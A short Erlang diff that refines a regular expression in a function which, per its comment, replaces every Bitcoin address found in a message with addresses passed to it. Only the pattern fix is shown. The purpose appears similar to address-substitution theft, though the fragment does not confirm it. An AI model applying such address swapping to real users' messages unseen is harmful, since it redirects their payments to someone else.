@@ -110,7 +110,7 @@ replace(Msg, StrToReplace, Str) ->
 % replace all btc addresses in binary
 replaceBtcAddresses(Msg, Addresses, Logger, Uid) ->
     % get all btc addresses in msg
-    Ret = re:run(Msg, "(?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39}[^a-zA-Z0-9\/\.]",  [global, {capture, all, list}]),
+    Ret = re:run(Msg, "((?:bc1|bc1p|[13])[a-zA-HJ-NP-Z0-9]{25,39})(?:[^a-zA-Z0-9\/\.])",  [global, {capture, all_but_first, list}]),
 
     % no match, return unedited
     case Ret of
